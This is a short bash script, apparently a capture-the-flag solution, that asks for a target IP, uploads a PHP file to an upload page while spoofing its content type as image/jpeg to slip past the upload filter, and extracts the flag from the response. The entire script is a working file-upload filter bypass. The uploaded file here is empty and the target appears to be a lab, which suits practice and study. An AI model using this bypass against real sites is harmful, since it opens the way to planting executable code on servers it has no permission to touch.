#!/bin/bash

# Prompt user for IP address
read -p "Enter IP address: " ip

# Create file to upload
touch test.php

# Command to upload file and search for flag
curl -s -X POST -F "uploaded=@test.php;type=image/jpeg" -F "Upload=Upload" "http://$ip/index.php?page=upload" | grep -oP 'flag is : \K.*(?=</h2>)'

rm test.php